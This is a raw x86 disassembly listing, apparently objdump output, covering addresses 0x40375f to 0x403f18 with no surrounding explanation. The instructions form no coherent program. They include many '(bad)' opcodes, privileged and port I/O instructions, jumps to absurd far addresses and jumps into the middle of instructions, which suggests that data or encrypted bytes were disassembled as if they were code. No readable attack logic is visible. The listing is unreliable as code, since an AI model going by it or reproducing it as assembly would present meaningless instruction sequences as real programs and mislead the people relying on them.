  40375f:	inc    ebp
  403760:	hlt    
  403761:	leave  
  403762:	nop
  403763:	call   0xf7df9eae
  403768:	push   cs
  403769:	xor    edi,ebx
  40376b:	aaa    
  40376c:	mov    esi,0x2d26efb5
  403771:	and    BYTE PTR [ebx+ebx*2-0x3f05115d],al
  403778:	push   edi
  403779:	enter  0x6df2,0x94
  40377d:	mov    bx,0x3b5e
  403781:	xchg   DWORD PTR [ecx+ebp*2+0x476bdb8],ecx
  403788:	rcr    DWORD PTR [ecx+edi*2-0x9b5cee6],1
  40378f:	ja     0x40371c
  403791:	fnstenv [ebx+0x48]
  403794:	push   esi
  403795:	add    al,BYTE PTR ss:[edi+0x182810c5]
  40379c:	mov    bl,0xb1
  40379e:	out    dx,al
  40379f:	inc    edi
  4037a0:	sbb    DWORD PTR [ebx-0x15],edx
  4037a3:	pop    ds
  4037a4:	int3   
  4037a5:	jne    0x4037a3
  4037a7:	rol    dh,1
  4037a9:	jmp    0x4037c9
  4037ab:	mov    WORD PTR [esi-0x729842f0],es
  4037b1:	jb     0x403777
  4037b3:	dec    eax
  4037b4:	sub    ebx,DWORD PTR [ebp+0x1e7f207f]
  4037ba:	add    ebp,DWORD PTR [ebx-0x1]
  4037bd:	sti    
  4037be:	addr16 mov ecx,0x8ca690d3
  4037c4:	(bad)
  4037c7:	mov    eax,0xc18a68df
  4037cc:	fbld   TBYTE PTR ss:[edx]
  4037cf:	mov    al,0xcd
  4037d1:	icebp  
  4037d2:	jae    0x40383a
  4037d4:	mov    ds,WORD PTR [edx+0x60]
  4037d7:	ret    
  4037d8:	int3   
  4037d9:	adc    eax,0x6e2f84ab
  4037de:	pop    esi
  4037df:	and    BYTE PTR [ecx+0x3],0xec
  4037e3:	imul   ebp,DWORD PTR [esp+eax*1+0x57ff58bf],0xffffffd3
  4037eb:	jmp    0x403838
  4037ed:	push   0xe7bd91ed
  4037f2:	lods   al,BYTE PTR ds:[esi]
  4037f3:	inc    edx
  4037f4:	add    DWORD PTR [edx-0x80],eax
  4037f7:	retf   0x17d6
  4037fa:	push   ss
  4037fb:	mov    esp,0x28f3a921
  403800:	mov    eax,0xeb940bfa
  403805:	test   DWORD PTR [edi+eax*4-0xd],edi
  403809:	jb     0x403799
  40380b:	cmp    edx,ecx
  40380d:	jg     0x40386c
  40380f:	loop   0x4037ee
  403811:	inc    eax
  403812:	mov    bh,0x25
  403814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403815:	jns    0x40381f
  403817:	(bad)  
  403818:	pushf  
  403819:	push   edx
  40381a:	mov    ah,0x90
  40381c:	sti    
  40381d:	add    edx,ecx
  40381f:	popa   
  403820:	in     al,dx
  403821:	inc    edx
  403822:	xor    edi,DWORD PTR [eax-0x7fc74140]
  403828:	inc    DWORD PTR [ebp+ecx*2-0x76]
  40382c:	int    0x64
  40382e:	dec    esp
  40382f:	test   DWORD PTR [edx-0x3a],esi
  403832:	inc    edx
  403833:	(bad)  
  403834:	gs jns 0x403828
  403837:	mov    esi,esi
  403839:	pusha  
  40383a:	ret    
  40383b:	lds    ecx,FWORD PTR [edi]
  40383d:	inc    ecx
  40383e:	push   edi
  40383f:	adc    eax,0x153226aa
  403844:	sub    ecx,DWORD PTR [ebx]
  403846:	pop    ecx
  403847:	into   
  403848:	dec    ebx
  403849:	push   ebx
  40384a:	sub    BYTE PTR [edx],0x94
  40384d:	xchg   DWORD PTR [edi],ebp
  40384f:	stos   BYTE PTR es:[edi],al
  403850:	in     al,0xa5
  403852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403853:	sbb    al,0x39
  403855:	lock and dl,BYTE PTR [esi-0x59941cd7]
  40385c:	mov    ds:0x735a15d9,eax
  403861:	and    edi,DWORD PTR [ebp-0x34]
  403864:	sub    BYTE PTR [edi+0xe53eecf],dh
  40386a:	xor    esp,edi
  40386c:	xlat   BYTE PTR ds:[ebx]
  40386d:	int    0x91
  40386f:	lods   eax,DWORD PTR ds:[esi]
  403870:	test   DWORD PTR [eax],esi
  403872:	jae    0x4038b8
  403874:	std    
  403875:	dec    ebp
  403876:	cmp    eax,0x38296a9a
  40387b:	xchg   DWORD PTR [ebx],ecx
  40387d:	or     al,0xfa
  40387f:	ins    BYTE PTR es:[edi],dx
  403880:	mov    DWORD PTR [esi],edx
  403882:	xchg   ebp,eax
  403883:	jae    0x403851
  403885:	clc    
  403886:	pop    edi
  403887:	inc    esi
  403888:	dec    eax
  403889:	dec    edi
  40388a:	jmp    0x7f1e:0x8076c81c
  403891:	jbe    0x40389a
  403893:	and    eax,0x4cf7ec79
  403898:	fild   DWORD PTR [ecx-0x3eaff0d8]
  40389e:	shl    esi,1
  4038a0:	shl    BYTE PTR [ecx-0x63],0xe6
  4038a4:	add    BYTE PTR [ecx-0x27c6436d],cl
  4038aa:	ffreep st(7)
  4038ac:	mov    WORD PTR ds:0xfadfa001,ds
  4038b2:	retf   
  4038b3:	in     eax,dx
  4038b4:	repnz into 
  4038b6:	push   ds
  4038b7:	adc    BYTE PTR [edx-0xe679cfa],dl
  4038bd:	sub    eax,0x4dea288d
  4038c2:	sbb    al,0x67
  4038c4:	jecxz  0x4038ad
  4038c6:	dec    ebx
  4038c7:	xor    eax,0x90c54313
  4038cc:	xor    DWORD PTR ss:[edi+0x641db259],0x5a
  4038d4:	pusha  
  4038d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038d6:	in     eax,0x50
  4038d8:	in     al,0xbc
  4038da:	and    al,0xc3
  4038dc:	jne    0x403911
  4038de:	xchg   edi,eax
  4038df:	(bad)  
  4038e0:	js     0x40391e
  4038e2:	fild   QWORD PTR [eax-0x48]
  4038e5:	sbb    al,0xd7
  4038e7:	adc    DWORD PTR [ecx],eax
  4038e9:	jecxz  0x4038d0
  4038eb:	icebp  
  4038ec:	jmp    0x9625:0xe7261487
  4038f3:	std    
  4038f4:	imul   eax,DWORD PTR [ebp-0x45],0x17df33c1
  4038fb:	loop   0x403923
  4038fd:	or     BYTE PTR [ebx],cl
  4038ff:	mov    edx,DWORD PTR [ebx]
  403901:	inc    ecx
  403902:	ror    BYTE PTR [eax],cl
  403904:	neg    BYTE PTR [eax+esi*4-0x18dfe84]
  40390b:	popf   
  40390c:	inc    ebp
  40390d:	mov    ds:0xb6de6fc0,eax
  403912:	lods   al,BYTE PTR ds:[esi]
  403913:	mov    ecx,0xb6702ed8
  403918:	and    BYTE PTR [edi-0x488dc1af],ah
  40391e:	pop    eax
  40391f:	fwait
  403920:	or     eax,0xd7be7753
  403925:	mov    ds:0x4b8b09b1,eax
  40392a:	out    0xd2,al
  40392c:	mov    dh,0x60
  40392e:	sbb    al,0x24
  403930:	mov    ch,0x4b
  403932:	fld    DWORD PTR [esi-0x3e125f15]
  403938:	jb     0x403973
  40393a:	add    BYTE PTR [eax+0x18c6875d],dl
  403940:	pop    esi
  403941:	mov    ebx,0x9d5867d
  403946:	xchg   ebp,eax
  403947:	push   ebp
  403948:	gs jl  0x403996
  40394b:	or     BYTE PTR [ebp+0x2b8ee5f7],ah
  403951:	lahf   
  403952:	push   cs
  403953:	add    DWORD PTR [ecx+0x38],ebp
  403956:	std    
  403957:	dec    edi
  403958:	pusha  
  403959:	and    eax,DWORD PTR [ebx-0x7a]
  40395c:	pop    ss
  40395d:	inc    ecx
  40395e:	or     DWORD PTR [edi-0x694ba04d],ecx
  403964:	mov    esp,esp
  403966:	jnp    0x4038f1
  403968:	test   DWORD PTR [esi],ebp
  40396a:	push   esi
  40396b:	repz ror ecx,0x55
  40396f:	inc    esp
  403970:	pop    ebp
  403971:	push   esi
  403972:	sbb    DWORD PTR [edx+edi*1],esp
  403975:	or     dl,BYTE PTR [ecx-0x6c]
  403978:	add    eax,0xbf3394f1
  40397d:	sbb    DWORD PTR [esp+esi*1+0x43],esi
  403981:	sbb    al,0xe2
  403983:	jbe    0x40390a
  403985:	data16 jle 0x4039fb
  403988:	push   eax
  403989:	cmp    eax,0x4c1dd54
  40398e:	enter  0xe0ce,0xfb
  403992:	lods   al,BYTE PTR ds:[esi]
  403993:	in     al,dx
  403994:	and    BYTE PTR [edx+ecx*1+0x45],dh
  403998:	pusha  
  403999:	adc    BYTE PTR [edx-0x65],ch
  40399c:	mov    esp,ds
  40399e:	test   eax,0x844bed7a
  4039a3:	ficom  WORD PTR [ebx-0x6b]
  4039a6:	ins    BYTE PTR es:[edi],dx
  4039a7:	push   esi
  4039a8:	or     DWORD PTR [edx+0x6],edx
  4039ab:	adc    eax,0xed98b9b5
  4039b0:	push   0x17
  4039b2:	xor    DWORD PTR [ebx-0x3670bbd6],ebp
  4039b8:	cmp    eax,0x62bcdf34
  4039bd:	cmp    esi,DWORD PTR [ecx]
  4039bf:	aam    0xf1
  4039c1:	repz pop eax
  4039c3:	xor    bl,BYTE PTR [eax]
  4039c5:	mov    esp,0xb971eb7
  4039ca:	inc    edx
  4039cb:	ror    esp,1
  4039cd:	adc    DWORD PTR [esi+0xeb4d6b8],esp
  4039d3:	xchg   ecx,eax
  4039d4:	and    al,0xae
  4039d6:	cs add eax,0x8601b6ba
  4039dc:	mov    ebx,0x9215d7d4
  4039e1:	addr16 mov al,ds:0x9c4
  4039e5:	and    BYTE PTR [ebp-0x62],0x95
  4039e9:	jge    0x40397e
  4039eb:	sub    cl,BYTE PTR [edi-0x6982c261]
  4039f1:	mov    ah,0x36
  4039f3:	fwait
  4039f4:	cmp    bl,BYTE PTR gs:[esi+ecx*2-0x32]
  4039f9:	mov    ebx,0xac59d1fa
  4039fe:	shr    BYTE PTR [ebx+0x69c3929f],cl
  403a04:	in     eax,0x73
  403a06:	pusha  
  403a07:	mov    ch,0x6f
  403a09:	pop    ebp
  403a0a:	stos   BYTE PTR es:[edi],al
  403a0b:	ficom  DWORD PTR [edi]
  403a0d:	imul   eax,edx,0x384bd9ce
  403a13:	fisub  DWORD PTR [edi*2-0x337a80de]
  403a1a:	inc    DWORD PTR [ebp-0x27144fcf]
  403a20:	jb     0x4039c7
  403a22:	sti    
  403a23:	gs mul bh
  403a26:	and    ebx,DWORD PTR [esi+ebx*1+0x557dd5ff]
  403a2d:	inc    esp
  403a2e:	test   DWORD PTR [ebx-0x4e],eax
  403a31:	nop
  403a32:	inc    ecx
  403a33:	ins    BYTE PTR es:[edi],dx
  403a34:	jmp    0xcd7edb06
  403a39:	dec    ecx
  403a3a:	(bad)  
  403a3b:	in     al,0x94
  403a3d:	sar    DWORD PTR [esi],1
  403a3f:	fs jg  0x403a0b
  403a42:	(bad)  
  403a44:	push   ecx
  403a45:	std    
  403a46:	pop    ebx
  403a47:	popa   
  403a48:	jge    0x403a7d
  403a4a:	ror    esp,cl
  403a4c:	mov    bh,0x23
  403a4e:	push   ecx
  403a4f:	pop    ds
  403a50:	lahf   
  403a51:	stc    
  403a52:	jg     0x403ac3
  403a54:	imul   esi,DWORD PTR [edi+0x3bb1a14a],0x175596ae
  403a5e:	iret   
  403a5f:	pushf  
  403a60:	inc    esi
  403a61:	lds    esi,FWORD PTR [esi-0x23]
  403a64:	ds lock test esp,eax
  403a68:	popf   
  403a69:	or     eax,0xf6fb29e7
  403a6e:	add    BYTE PTR [ebp+ebp*2-0x14],dh
  403a72:	mov    esi,0x6bac5f0b
  403a77:	mov    ecx,0x9a37554b
  403a7c:	fld    DWORD PTR [ebp-0x67]
  403a7f:	cdq    
  403a80:	push   ebp
  403a81:	leave  
  403a82:	sbb    edx,DWORD PTR [eax+0xead0602]
  403a88:	jb     0x403b08
  403a8a:	cld    
  403a8b:	adc    BYTE PTR [ebx-0x1c93dd68],cl
  403a91:	push   esp
  403a92:	sub    dh,cl
  403a94:	xchg   DWORD PTR [ebp+0x3f],ebx
  403a97:	cmp    eax,edi
  403a99:	sub    BYTE PTR [ecx+0x49],0x9e
  403a9d:	mov    es,esp
  403a9f:	lea    eax,[ebx-0x688bfe3e]
  403aa5:	fldcw  WORD PTR ds:0xc4158af9
  403aab:	inc    eax
  403aac:	in     eax,0x6f
  403aae:	jbe    0x403ac8
  403ab0:	rol    BYTE PTR [esi+0x75],1
  403ab3:	stos   DWORD PTR es:[edi],eax
  403ab4:	push   ebp
  403ab5:	xor    eax,esp
  403ab7:	outs   dx,DWORD PTR ds:[esi]
  403ab8:	push   esi
  403ab9:	inc    esp
  403aba:	or     dl,BYTE PTR [ebx]
  403abc:	sub    dl,0xf3
  403abf:	add    bh,BYTE PTR [ecx-0x5b]
  403ac2:	lds    eax,FWORD PTR [ebp-0x1]
  403ac5:	xlat   BYTE PTR ds:[ebx]
  403ac6:	icebp  
  403ac7:	dec    esp
  403ac8:	pop    ss
  403ac9:	dec    esp
  403aca:	mov    al,ds:0x8c86e1cb
  403acf:	icebp  
  403ad0:	push   esi
  403ad1:	pop    esp
  403ad2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ad3:	and    DWORD PTR [esp+eax*1],ecx
  403ad6:	sub    al,0x93
  403ad8:	mov    al,ds:0x1be18790
  403add:	mov    dl,0x26
  403adf:	ja     0x403a63
  403ae1:	ins    DWORD PTR es:[edi],dx
  403ae2:	icebp  
  403ae3:	into   
  403ae4:	test   al,0xa8
  403ae6:	and    ah,al
  403ae8:	es (bad) 
  403aea:	jns    0x403a7b
  403aec:	mov    ah,0x29
  403aee:	and    eax,0x1821dedf
  403af3:	xlat   BYTE PTR ds:[ebx]
  403af4:	test   eax,0xa2cb2a7b
  403af9:	push   0xb09e0105
  403afe:	gs or  edx,ecx
  403b01:	ins    DWORD PTR es:[edi],dx
  403b02:	push   ebp
  403b03:	inc    esp
  403b04:	repnz imul ecx,DWORD PTR [ebx-0x32],0x44
  403b09:	mov    WORD PTR [eax+0x75fd99cd],ds
  403b0f:	loop   0x403aeb
  403b11:	lea    ebp,[edi+0x16537adc]
  403b17:	ror    BYTE PTR fs:[esi+0x1a],0x1e
  403b1c:	lahf   
  403b1d:	mov    bl,0xc1
  403b1f:	jg     0x403af7
  403b21:	sub    DWORD PTR [edx+0x2a],edi
  403b24:	cmp    al,0x6d
  403b26:	int    0x9f
  403b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b29:	cmp    DWORD PTR [esi],edi
  403b2b:	fcom   QWORD PTR [edx-0x531b71bf]
  403b31:	add    bh,BYTE PTR [esi]
  403b33:	ss push esi
  403b35:	push   es
  403b36:	je     0x403b5a
  403b38:	dec    ebx
  403b39:	test   ah,dh
  403b3b:	sti    
  403b3c:	dec    esi
  403b3d:	in     eax,0x23
  403b3f:	sbb    al,0x19
  403b41:	adc    al,0x13
  403b43:	or     ah,BYTE PTR [edx]
  403b45:	popa   
  403b46:	push   edx
  403b47:	mov    gs,WORD PTR [edi+0x6e7c3b26]
  403b4d:	retf   
  403b4e:	gs jecxz 0x403b94
  403b51:	mov    eax,ds:0x3097b2c2
  403b56:	inc    eax
  403b57:	cvtps2pi mm7,QWORD PTR [ecx+0x39375e6e]
  403b5e:	rol    BYTE PTR [ebp+0x16927ac9],cl
  403b64:	dec    ebp
  403b65:	in     eax,dx
  403b66:	xor    DWORD PTR [ebx+0x5b4a41fc],0xd0634b77
  403b70:	rol    BYTE PTR [edx+0x1],0xfb
  403b74:	test   BYTE PTR [edi+0x1c],0x8c
  403b78:	std    
  403b79:	adc    al,0xd3
  403b7b:	push   edi
  403b7c:	rcl    BYTE PTR [ecx+0x5c],1
  403b7f:	xor    ah,bh
  403b81:	stos   DWORD PTR es:[edi],eax
  403b82:	xor    ebp,DWORD PTR [eax]
  403b84:	loopne 0x403bc9
  403b86:	loope  0x403b88
  403b88:	adc    dh,BYTE PTR [ebx+0x6a02d7d9]
  403b8e:	and    dh,BYTE PTR cs:[ebp+eax*4+0x43c4bdaf]
  403b96:	and    bh,ch
  403b98:	aad    0xe3
  403b9a:	mov    edx,0x305ab158
  403b9f:	or     BYTE PTR [edx],dl
  403ba1:	mov    edx,0xbdd94542
  403ba6:	xchg   edi,eax
  403ba7:	and    ecx,DWORD PTR [ebx+0x19]
  403baa:	adc    al,0x48
  403bac:	push   ebx
  403bad:	dec    esp
  403bae:	mov    ch,BYTE PTR [ebx]
  403bb0:	mov    edx,0xaf9a8ae4
  403bb5:	leave  
  403bb6:	jae    0x403bfb
  403bb8:	jnp    0x403b5d
  403bba:	mov    bl,0x5c
  403bbc:	xchg   esi,eax
  403bbd:	mov    edi,0xc0363f18
  403bc2:	outs   dx,DWORD PTR ds:[esi]
  403bc3:	or     ch,BYTE PTR [edi-0x2c]
  403bc6:	jnp    0x403c34
  403bc8:	adc    ebx,DWORD PTR [eax-0x42]
  403bcb:	xchg   ebp,eax
  403bcc:	stos   DWORD PTR es:[edi],eax
  403bcd:	push   0x43807476
  403bd2:	(bad)  
  403bd3:	js     0x403bdc
  403bd5:	and    esi,DWORD PTR [ebx+0x4b]
  403bd8:	mov    ds:0x66825668,al
  403bdd:	aad    0xd
  403bdf:	and    eax,0x6a23557b
  403be4:	ss pop edi
  403be6:	mov    al,ds:0x2a744397
  403beb:	(bad)  
  403bec:	inc    edx
  403bed:	cs cmp eax,edi
  403bf0:	jnp    0x403c03
  403bf2:	in     eax,dx
  403bf3:	add    ebp,esp
  403bf5:	popa   
  403bf6:	neg    BYTE PTR [edx+0x5d3dc5cf]
  403bfc:	xor    al,0x53
  403bfe:	jl     0x403bae
  403c00:	nop
  403c01:	mov    ecx,0x6b9f2055
  403c06:	test   BYTE PTR [eax+0x5e653f16],dh
  403c0c:	cmp    eax,0x10240870
  403c11:	fwait
  403c12:	test   eax,0x34c2f22
  403c17:	sbb    eax,ebx
  403c19:	lea    ebx,[edx]
  403c1b:	sub    bl,BYTE PTR [ebp-0xc538f23]
  403c21:	cmp    eax,0x44a0312a
  403c26:	lea    esi,[ecx]
  403c28:	invd   
  403c2a:	enter  0x32ef,0x3b
  403c2e:	inc    eax
  403c2f:	or     eax,0x480f9763
  403c34:	(bad)  
  403c36:	mov    dl,0xc7
  403c38:	sbb    DWORD PTR [ecx+edi*4],ecx
  403c3b:	bound  ebx,QWORD PTR [ecx+0x2d]
  403c3e:	sar    dl,0x2d
  403c41:	sub    BYTE PTR [esi],bl
  403c43:	xchg   edx,eax
  403c44:	and    bh,BYTE PTR [edx+0x1f]
  403c47:	ins    DWORD PTR es:[edi],dx
  403c48:	aad    0x77
  403c4a:	dec    eax
  403c4b:	mov    ch,0x6e
  403c4d:	push   0xa3c84807
  403c52:	or     esi,edx
  403c54:	leave  
  403c55:	les    ebp,FWORD PTR [ecx+0x66]
  403c58:	and    eax,0x3ff33c89
  403c5d:	sbb    edi,DWORD PTR [edi-0x13]
  403c60:	jbe    0x403ccb
  403c62:	or     DWORD PTR [edx-0x1d],esi
  403c65:	gs cmc 
  403c67:	cld    
  403c68:	fcomp  DWORD PTR [ecx]
  403c6a:	cmp    esi,esi
  403c6c:	sub    ch,bh
  403c6e:	sti    
  403c6f:	fwait
  403c70:	push   eax
  403c71:	mov    eax,ds:0x946f0290
  403c76:	adc    DWORD PTR [esi],ecx
  403c78:	(bad)  
  403c79:	cmp    ecx,DWORD PTR [ebx+0xd92f0a0]
  403c7f:	mov    ah,0xec
  403c81:	push   eax
  403c82:	adc    ecx,DWORD PTR [esi]
  403c84:	add    ah,al
  403c86:	jmp    0x8508dbf7
  403c8b:	(bad)  
  403c8d:	or     edx,DWORD PTR [edi-0x12]
  403c90:	sbb    dl,BYTE PTR [ebx+0x24]
  403c93:	js     0x403c2b
  403c95:	lds    ebx,FWORD PTR [ebx+0x11397c77]
  403c9b:	inc    ecx
  403c9c:	leave  
  403c9d:	pop    es
  403c9e:	out    dx,eax
  403c9f:	aas    
  403ca0:	xchg   esi,eax
  403ca1:	mov    al,BYTE PTR [edi+edi*8+0x8e54338]
  403ca8:	pop    edi
  403ca9:	xchg   esi,eax
  403caa:	(bad)  
  403cab:	in     eax,0x3c
  403cad:	inc    ecx
  403cae:	in     al,0x73
  403cb0:	add    BYTE PTR [edi+0x664ac9fd],cl
  403cb6:	inc    esp
  403cb7:	dec    edi
  403cb8:	xlat   BYTE PTR ds:[ebx]
  403cb9:	ret    
  403cba:	das    
  403cbb:	mov    cl,0xb
  403cbd:	(bad)
  403cc0:	gs xchg esp,eax
  403cc2:	mov    edx,0xa58acfd2
  403cc7:	popf   
  403cc8:	popa   
  403cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cca:	mov    ebx,0x52ec11e2
  403ccf:	cli    
  403cd0:	loope  0x403c6e
  403cd2:	mov    bh,0x2f
  403cd4:	adc    BYTE PTR [edx+0x6a],0x57
  403cd8:	aam    0x16
  403cda:	fistp  DWORD PTR [eax-0x71c0ab6e]
  403ce0:	rcl    BYTE PTR [eax+0x6297c02],cl
  403ce6:	pop    ebx
  403ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ce9:	aad    0x6d
  403ceb:	test   BYTE PTR [edx-0x21],cl
  403cee:	shr    BYTE PTR [edi],1
  403cf0:	mov    WORD PTR [esi+eiz*2-0x5204c264],gs
  403cf7:	fucomip st,st(0)
  403cf9:	call   0x3627:0x983aa5d9
  403d00:	pop    ebx
  403d01:	in     al,0x65
  403d03:	stc    
  403d04:	in     al,dx
  403d05:	scas   al,BYTE PTR es:[edi]
  403d06:	shr    BYTE PTR [ecx],cl
  403d08:	sub    BYTE PTR [ecx+0x5ad559cc],ch
  403d0e:	add    ebp,edx
  403d10:	cdq    
  403d11:	jmp    0x4204:0x4a92dfe5
  403d18:	pop    DWORD PTR [ecx-0x42]
  403d1b:	pop    ds
  403d1c:	push   es
  403d1d:	add    al,0x8b
  403d1f:	dec    eax
  403d20:	inc    ecx
  403d21:	xchg   esp,edi
  403d23:	sbb    eax,0xb783e80f
  403d28:	ret    0xcd42
  403d2b:	sbb    edx,DWORD PTR [ebp-0xc]
  403d2e:	push   0x42
  403d30:	fnstenv [ebx]
  403d32:	stos   BYTE PTR es:[edi],al
  403d33:	push   eax
  403d34:	inc    BYTE PTR [edi+0x1e9a7d41]
  403d3a:	cmc    
  403d3b:	(bad)  
  403d3c:	dec    edi
  403d3d:	mov    ecx,0xd73ae883
  403d42:	mov    ch,0x10
  403d44:	dec    edx
  403d45:	cld    
  403d46:	aas    
  403d47:	mov    ch,0x5a
  403d49:	pop    eax
  403d4a:	shr    edx,cl
  403d4c:	pusha  
  403d4d:	mov    WORD PTR [edi-0x2f5757d9],ss
  403d53:	mov    cl,0xef
  403d55:	xchg   DWORD PTR [esi],eax
  403d57:	jmp    0x6e8c21f2
  403d5c:	std    
  403d5d:	sbb    BYTE PTR [edi],bl
  403d5f:	xor    ah,cl
  403d61:	mov    fs,esp
  403d63:	xchg   ecx,eax
  403d64:	pop    ecx
  403d65:	(bad)  
  403d66:	pcmpgtb mm2,QWORD PTR [ecx]
  403d69:	or     dl,BYTE PTR [ebp+0x2d1fb3bb]
  403d6f:	js     0x403dc0
  403d71:	in     al,0x19
  403d73:	mov    bl,0xf0
  403d75:	inc    edx
  403d76:	test   BYTE PTR [ecx],ah
  403d78:	pop    ebp
  403d79:	out    dx,eax
  403d7a:	mov    ds:0xa37512c8,eax
  403d7f:	xor    esi,esp
  403d81:	sbb    al,0x4a
  403d83:	mov    ah,0x34
  403d85:	retf   
  403d86:	std    
  403d87:	es xchg ebx,eax
  403d89:	add    esi,DWORD PTR [edx]
  403d8b:	test   al,0xd
  403d8d:	pop    esi
  403d8e:	sbb    ebx,DWORD PTR [edi+0xf429a38]
  403d94:	or     esp,DWORD PTR ds:0xc1c8f353
  403d9a:	dec    ebx
  403d9b:	fst    DWORD PTR [esi]
  403d9d:	push   eax
  403d9e:	xchg   ebp,eax
  403d9f:	push   edx
  403da0:	add    edx,0xb1d362b1
  403da6:	mov    cl,0xa2
  403da8:	inc    eax
  403da9:	sub    DWORD PTR [edx+0x1c5ea07c],ebp
  403daf:	add    edx,DWORD PTR [ebp+0x5d70bb4c]
  403db5:	push   0x4192096b
  403dba:	mov    edx,0x793db0b5
  403dbf:	xor    al,0xc0
  403dc1:	jbe    0x403de6
  403dc3:	or     eax,0x41b9e56c
  403dc8:	dec    edx
  403dc9:	out    dx,al
  403dca:	pop    eax
  403dcb:	inc    ebx
  403dcc:	sar    esp,cl
  403dce:	repnz (bad) 
  403dd0:	jb     0x403e44
  403dd2:	loopne 0x403e13
  403dd4:	jae    0x403e48
  403dd6:	jae    0x403d85
  403dd8:	(bad)  
  403dd9:	jge    0x403de9
  403ddb:	fld    QWORD PTR [eax+0x44]
  403dde:	outs   dx,DWORD PTR ds:[esi]
  403ddf:	popa   
  403de0:	stos   BYTE PTR es:[edi],al
  403de1:	adc    dl,BYTE PTR [edx+ebx*1]
  403de4:	fucomi st,st(0)
  403de6:	mov    ch,0x8c
  403de8:	inc    eax
  403de9:	mov    DWORD PTR [eax-0x26db0e05],edi
  403def:	test   BYTE PTR [ebx+ebx*2],cl
  403df2:	dec    esp
  403df3:	outs   dx,BYTE PTR ds:[esi]
  403df4:	inc    edx
  403df5:	adc    ebx,DWORD PTR [ecx*1+0x17034ee8]
  403dfc:	mov    dh,0x2e
  403dfe:	or     al,0xe9
  403e00:	sti    
  403e01:	push   eax
  403e02:	rcl    BYTE PTR [edi+ecx*1],1
  403e05:	push   0x57
  403e07:	adc    DWORD PTR ss:[ebx+0x45e23066],ebp
  403e0e:	shr    BYTE PTR [ebx],0x1d
  403e11:	imul   ecx,ebp,0xfffffff5
  403e14:	test   BYTE PTR [eax-0x76],bl
  403e17:	jnp    0x403dbd
  403e19:	and    ch,al
  403e1b:	push   0xa53c7283
  403e20:	sub    edi,edi
  403e22:	ret    0xd038
  403e25:	jl     0x403e37
  403e27:	ds ret 0xe17c
  403e2b:	test   ecx,esp
  403e2d:	jge    0x403de9
  403e2f:	add    al,0x1
  403e31:	mov    dl,ch
  403e33:	ss push ds
  403e35:	fnstcw WORD PTR [edi-0x27]
  403e38:	xor    BYTE PTR [ebp+0x23],dl
  403e3b:	repz das 
  403e3d:	cmp    cl,BYTE PTR [eax]
  403e3f:	addr16 jae 0x403e25
  403e42:	aad    0x76
  403e44:	stos   DWORD PTR es:[edi],eax
  403e45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e46:	xor    ebx,eax
  403e48:	jb     0x403e76
  403e4a:	xchg   esp,eax
  403e4b:	xchg   ebp,eax
  403e4c:	fsubr  QWORD PTR [esi-0x6]
  403e4f:	std    
  403e50:	mov    edi,0xb52eb180
  403e55:	in     eax,0xba
  403e57:	shl    eax,cl
  403e59:	pop    ebx
  403e5a:	jne    0x403e1c
  403e5c:	dec    esi
  403e5d:	or     ah,BYTE PTR [ebx-0x32]
  403e60:	mov    ecx,0x2aeae514
  403e65:	mov    bh,0xef
  403e67:	xor    cl,BYTE PTR [esi]
  403e69:	sbb    cl,BYTE PTR [edi+edx*4+0x59eca1b]
  403e70:	dec    ebx
  403e71:	inc    ecx
  403e72:	push   es
  403e73:	cdq    
  403e74:	cmc    
  403e75:	sti    
  403e76:	sub    ebx,ebp
  403e78:	or     ah,ah
  403e7a:	lock std 
  403e7c:	mov    cl,BYTE PTR [ecx]
  403e7e:	repz pop es
  403e80:	daa    
  403e81:	stos   BYTE PTR es:[edi],al
  403e82:	mov    ebx,0xcb651cba
  403e87:	inc    esi
  403e88:	pop    ss
  403e89:	sbb    DWORD PTR [edi-0x13],edx
  403e8c:	mov    edi,0x8e787927
  403e91:	test   BYTE PTR [edx],0x26
  403e94:	scas   al,BYTE PTR es:[edi]
  403e95:	pop    ebx
  403e96:	mov    eax,ds:0x2c5df68d
  403e9b:	pusha  
  403e9c:	mov    dl,0xd8
  403e9e:	sbb    DWORD PTR [ebx],eax
  403ea0:	in     al,dx
  403ea1:	cmp    eax,0xcfc5cc8f
  403ea6:	jmp    0x403e68
  403ea8:	or     cl,BYTE PTR [edx-0xb]
  403eab:	jns    0x403e2f
  403ead:	and    eax,0xb5546c9a
  403eb2:	rcr    DWORD PTR [edi],cl
  403eb4:	jle    0x403f17
  403eb6:	jnp    0x403e6a
  403eb8:	stos   DWORD PTR es:[edi],eax
  403eb9:	js     0x403ee3
  403ebb:	xor    edx,ebx
  403ebd:	xor    al,0xbf
  403ebf:	inc    eax
  403ec0:	cwde   
  403ec1:	ins    DWORD PTR es:[edi],dx
  403ec2:	mov    ds:0x3509cde3,al
  403ec7:	ja     0x403e82
  403ec9:	ret    
  403eca:	inc    edi
  403ecb:	pop    ecx
  403ecc:	ja     0x403ea2
  403ece:	pop    ecx
  403ecf:	add    eax,DWORD PTR [ecx+edi*8]
  403ed2:	repnz add cl,BYTE PTR [ecx-0x9184fbd]
  403ed9:	adc    cl,al
  403edb:	std    
  403edc:	xor    eax,0xf7ddb6e5
  403ee1:	push   ss
  403ee2:	ins    DWORD PTR es:[edi],dx
  403ee3:	sbb    ebp,DWORD PTR [ecx+0x7c607227]
  403ee9:	push   ebx
  403eea:	rcl    DWORD PTR [edi+0x1ab4169d],cl
  403ef0:	(bad)  
  403ef1:	jns    0x403ec5
  403ef3:	dec    edx
  403ef4:	mov    dh,0x2a
  403ef6:	inc    ebp
  403ef7:	sti    
  403ef8:	stos   DWORD PTR es:[edi],eax
  403ef9:	push   ebp
  403efa:	lea    eax,[esi+0x3e]
  403efd:	jmp    0x403f65
  403eff:	jne    0x403f01
  403f01:	js     0x403ef1
  403f03:	(bad)  
  403f04:	arpl   WORD PTR [ecx-0x3d6f8bf6],cx
  403f0a:	push   esi
  403f0b:	push   edi
  403f0c:	fistp  QWORD PTR [eax+0x2]
  403f0f:	aas    
  403f10:	adc    BYTE PTR [eax-0xe4aa5ea],cl
  403f16:	jmp    0x403ef4
  403f18:	sahf   
